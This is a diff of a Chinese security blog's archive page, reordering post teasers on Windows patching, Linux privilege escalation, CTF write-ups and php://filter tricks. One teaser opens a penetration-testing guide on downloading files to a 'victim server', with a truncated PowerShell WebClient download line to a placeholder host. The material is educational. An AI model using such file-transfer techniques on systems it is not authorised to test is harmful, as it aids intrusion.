@@ -189,6 +189,24 @@ JoomlaJoomla是一套全球有名的CMS系统，之前玩vulnhub的靶机也有�
                                     </div>
                                     <div class="timeline-marker"></div>
                                     <div class="timeline-content">
+                                        <a class="timeline-title" target="_self" href="knlvre.github.io/2019/10/04/Windows系统添加补丁/">Windows系统添加补丁</a>
+                                        <p>
+                                            # 
+补丁下载各种各样的漏洞需要与其对应的补丁去修复，漏洞的详情和补丁的下载可以直接到Microsoft的官网去查看和下载：https://docs.microsoft.com/zh-cn/security-updates/
+点击左边栏的Security Bulletins可以查找想要看的漏洞
+
+这里以打MS16-032（CVE-2016-0099）的补丁为例：左边栏找到MS16-032，找...
+                                        </p>
+                                    </div>
+                                </li>
+                            
+                                
+                                <li class="timeline-item">
+                                    <div class="timeline-info">
+                                        <span class="gradient-text">October 04, 2019</span>
+                                    </div>
+                                    <div class="timeline-marker"></div>
+                                    <div class="timeline-content">
                                         <a class="timeline-title" target="_self" href="knlvre.github.io/2019/10/04/Linux 提权常用命令集/">Linux 提权常用命令集</a>
                                         <p>
                                             本文转载自原文：Linux 提权常用命令集
@@ -207,13 +225,12 @@ JoomlaJoomla是一套全球有名的CMS系统，之前玩vulnhub的靶机也有�
                                     </div>
                                     <div class="timeline-marker"></div>
                                     <div class="timeline-content">
-                                        <a class="timeline-title" target="_self" href="knlvre.github.io/2019/10/04/Windows系统添加补丁/">Windows系统添加补丁</a>
+                                        <a class="timeline-title" target="_self" href="knlvre.github.io/2019/10/04/十三种方式下载文件/">十三种方式下载文件</a>
                                         <p>
-                                            # 
-补丁下载各种各样的漏洞需要与其对应的补丁去修复，漏洞的详情和补丁的下载可以直接到Microsoft的官网去查看和下载：https://docs.microsoft.com/zh-cn/security-updates/
-点击左边栏的Security Bulletins可以查找想要看的漏洞
-
-这里以打MS16-032（CVE-2016-0099）的补丁为例：左边栏找到MS16-032，找...
+                                            本文转载自原文：13种方式下载文件
+渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。
+0x01 Powershell创建如下PSH脚本：
+12345$p = New-Object System.Net.WebClient$p.DownloadFile("http://domain/file","C:%homepath%file")如：$p....
                                         </p>
                                     </div>
                                 </li>
@@ -234,23 +251,6 @@ exploit-db的详情：https://www.exploit-db.com/exploits/39574/
 
 ①系统需要拥有至少2个的CPU核心
 ②...
-                                        </p>
-                                    </div>
-                                </li>
-                            
-                                
-                                <li class="timeline-item">
-                                    <div class="timeline-info">
-                                        <span class="gradient-text">October 04, 2019</span>
-                                    </div>
-                                    <div class="timeline-marker"></div>
-                                    <div class="timeline-content">
-                                        <a class="timeline-title" target="_self" href="knlvre.github.io/2019/10/04/十三种方式下载文件/">十三种方式下载文件</a>
-                                        <p>
-                                            本文转载自原文：13种方式下载文件
-渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。
-0x01 Powershell创建如下PSH脚本：
-12345$p = New-Object System.Net.WebClient$p.DownloadFile("http://domain/file","C:%homepath%file")如：$p....
                                         </p>
                                     </div>
                                 </li>
@@ -388,21 +388,6 @@ DC-1环境虚拟机平台：VMware Workstation Pro
                                     </div>
                                     <div class="timeline-marker"></div>
                                     <div class="timeline-content">
-                                        <a class="timeline-title" target="_self" href="knlvre.github.io/2019/09/03/CTF比赛—2019XNUCA — ezphpWriteUp/">2019XNUCA — ezphp WriteUp</a>
-                                        <p>
-                                            前言没有参加本次比赛，只记录ezphp这一道题目，把同学的Writeup复现并记录下来
-ezphp源代码1234567891011121314151617181920212223242526272829303132&lt;?php 	$files = scandir('./');	foreach($files as $file)&#123;		if($file !== "index.php"...
-                                        </p>
-                                    </div>
-                                </li>
-                            
-                                
-                                <li class="timeline-item">
-                                    <div class="timeline-info">
-                                        <span class="gradient-text">September 03, 2019</span>
-                                    </div>
-                                    <div class="timeline-marker"></div>
-                                    <div class="timeline-content">
                                         <a class="timeline-title" target="_self" href="knlvre.github.io/2019/09/03/Linux系统下搭建Web服务器和FTP服务器/">Linux系统下搭建Web服务器和FTP服务器</a>
                                         <p>
                                             Web服务器安装与配置Apache2和php组件的安装使用如下命令来安装Apache2和php的组件
@@ -417,15 +402,14 @@ Ps：如果只安装Apache2，将会导致写的php文件无法被解析
                                 
                                 <li class="timeline-item">
                                     <div class="timeline-info">
-                                        <span class="gradient-text">September 01, 2019</span>
+                                        <span class="gradient-text">September 03, 2019</span>
                                     </div>
                                     <div class="timeline-marker"></div>
                                     <div class="timeline-content">
-                                        <a class="timeline-title" target="_self" href="knlvre.github.io/2019/09/01/转载 谈一谈php之filter的妙用/">转载 | php://filter的妙用</a>
+                                        <a class="timeline-title" target="_self" href="knlvre.github.io/2019/09/03/CTF比赛—2019XNUCA — ezphpWriteUp/">2019XNUCA — ezphp WriteUp</a>
                                         <p>
-                                            前言转载文章：https://www.leavesongs.com/PENETRATION/php-filter-magic.html
-php://filter是PHP中独有的协议，利用这个协议可以创造很多“妙用”，本文说几个有意思的点，剩下的大家自己下去体会。本来本文的思路我上半年就准备拿来做XDCTF2016的题目的，没想到被三个白帽的一题抢先用了，我也就只好提前分享一下。
-XXE中的使...
+                                            前言没有参加本次比赛，只记录ezphp这一道题目，把同学的Writeup复现并记录下来
+ezphp源代码1234567891011121314151617181920212223242526272829303132&lt;?php 	$files = scandir('./');	foreach($files as $file)&#123;		if($file !== "index.php"...
                                         </p>
                                     </div>
                                 </li>
@@ -450,6 +434,22 @@ XXE中的使...
 
 3.安装PyQt5-tools
 1pip ...
+                                        </p>
+                                    </div>
+                                </li>
+                            
+                                
+                                <li class="timeline-item">
+                                    <div class="timeline-info">
+                                        <span class="gradient-text">September 01, 2019</span>
+                                    </div>
+                                    <div class="timeline-marker"></div>
+                                    <div class="timeline-content">
+                                        <a class="timeline-title" target="_self" href="knlvre.github.io/2019/09/01/转载 谈一谈php之filter的妙用/">转载 | php://filter的妙用</a>
+                                        <p>
+                                            前言转载文章：https://www.leavesongs.com/PENETRATION/php-filter-magic.html
+php://filter是PHP中独有的协议，利用这个协议可以创造很多“妙用”，本文说几个有意思的点，剩下的大家自己下去体会。本来本文的思路我上半年就准备拿来做XDCTF2016的题目的，没想到被三个白帽的一题抢先用了，我也就只好提前分享一下。
+XXE中的使...
                                         </p>
                                     </div>
                                 </li>
@@ -617,9 +617,31 @@ flag{oho_oho_oho}
                                     </div>
                                     <div class="timeline-marker"></div>
                                     <div class="timeline-content">
-                                        <a class="timeline-title" target="_self" href="knlvre.github.io/2019/03/30/BugKuCTF—杂项题中常见的文件操作/">BugKuCTF — 杂项题中常见的文件知识点和操作</a>
+                                        <a class="timeline-title" target="_self" href="knlvre.github.io/2019/03/30/BugKuCTF—加密题 第1-10关/">BugKuCTF — 加密题(第1-10关)</a>
                                         <p>
-                                            常见的文件头1234567891011121314151617181920212223JPEG (jpg)，文件头：FF D8 FF E0PNG (png)，文件头：89 50 4E 47；文件尾：00 00 00 00 49 45 4E 44 AE 42 60 827z：37 7A BC AF 27 1CGIF (gif)：47 49 46 38 39 61ZIP Archive (zip...
+                                            第一关（滴答~滴）百度一下题目给的数字，发现是摩斯密码
+
+在线解密一下
+
+提交就对了
+
+
+第二关（聪明的小羊）题目提示很明显了：栅栏密码
+
+用Python写个脚本
+
+跑一下flag直接出来
+
+也可以使用网站：栅栏密码在线加密解密
+
+第三关（ok）好多的ok，那么这个就是Ook!编码
+
+找个在线解码网站：Brainfuck/Ook在线加密解密
+
+flag直接解出来
+
+
+第四关（这不是摩斯密码）...
                                         </p>
                                     </div>
                                 </li>
@@ -653,31 +675,9 @@ flag{oho_oho_oho}
                                     </div>
                                     <div class="timeline-marker"></div>
                                     <div class="timeline-content">
-                                        <a class="timeline-title" target="_self" href="knlvre.github.io/2019/03/30/BugKuCTF—加密题 第1-10关/">BugKuCTF — 加密题(第1-10关)</a>
+                                        <a class="timeline-title" target="_self" href="knlvre.github.io/2019/03/30/BugKuCTF—杂项题中常见的文件操作/">BugKuCTF — 杂项题中常见的文件知识点和操作</a>
                                         <p>
-                                            第一关（滴答~滴）百度一下题目给的数字，发现是摩斯密码
-
-在线解密一下
-
-提交就对了
-
-
-第二关（聪明的小羊）题目提示很明显了：栅栏密码
-
-用Python写个脚本
-
-跑一下flag直接出来
-
-也可以使用网站：栅栏密码在线加密解密
-
-第三关（ok）好多的ok，那么这个就是Ook!编码
-
-找个在线解码网站：Brainfuck/Ook在线加密解密
-
-flag直接解出来
-
-
-第四关（这不是摩斯密码）...
+                                            常见的文件头1234567891011121314151617181920212223JPEG (jpg)，文件头：FF D8 FF E0PNG (png)，文件头：89 50 4E 47；文件尾：00 00 00 00 49 45 4E 44 AE 42 60 827z：37 7A BC AF 27 1CGIF (gif)：47 49 46 38 39 61ZIP Archive (zip...
                                         </p>
                                     </div>
                                 </li>
